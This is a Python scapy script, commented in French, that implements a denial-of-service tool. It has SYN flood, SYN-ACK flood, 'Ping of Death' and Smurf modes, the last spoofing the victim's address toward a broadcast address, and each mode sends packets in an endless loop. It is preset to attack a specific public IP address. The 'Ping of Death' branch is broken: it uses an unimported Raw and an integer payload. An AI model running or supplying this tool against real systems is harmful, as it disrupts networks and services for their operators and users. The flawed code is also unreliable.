from scapy.all import IP, TCP, ICMP, send
import random
import ipaddress
import sys
from time import sleep

def ddos(target_ip, attack_type):
    # Validation de l'adresse IP cible
    try:
        ipaddress.ip_address(target_ip)
    except ValueError:
        print(f"Adresse IP non valide : {target_ip}")
        return

    target_port = 12345

    try:
        if attack_type == "syn_flood":
            while True:
                src_port = random.randint(1024, 65535)
                pkt = IP(dst=target_ip) / TCP(sport=src_port, dport=target_port, flags="S")
                print(pkt.summary())  # Vérifie le paquet avant de l'envoyer
                send(pkt, verbose=0)
                sleep(0.1)  # Ajoute un délai

        elif attack_type == "pod":  # Ping of Death
            while True:
                load = 6000
                pkt = IP(dst=target_ip) / ICMP() / Raw(load=load)
                print(pkt.summary())
                send(pkt, verbose=0)
                sleep(0.1)

        elif attack_type == "syn_ack":
            while True:
                src_port = random.randint(1024, 65535)
                pkt = IP(dst=target_ip) / TCP(sport=src_port, dport=target_port, flags="SA")
                print(pkt.summary())
                send(pkt, verbose=0)
                sleep(0.1)

        elif attack_type == "smurf":
            broadcast_ip = "255.255.255.255"  # Utilise une adresse de broadcast pour une attaque Smurf
            while True:
                pkt = IP(src=target_ip, dst=broadcast_ip) / ICMP()
                print(pkt.summary())
                send(pkt, verbose=0)
                sleep(0.1)

        else:
            print(f"Type d'attaque non valide : {attack_type}")

    except KeyboardInterrupt:
        print("\nAttaque arrêtée par l'utilisateur.")
        sys.exit(0)

# Variables
target_ip = "163.173.228.225"
attack_type = 'syn_ack'  # syn_flood, pod, syn_ack, smurf

try:
    ddos(target_ip, attack_type)
except KeyboardInterrupt:
    print("\nAttaque arrêtée par l'utilisateur.")
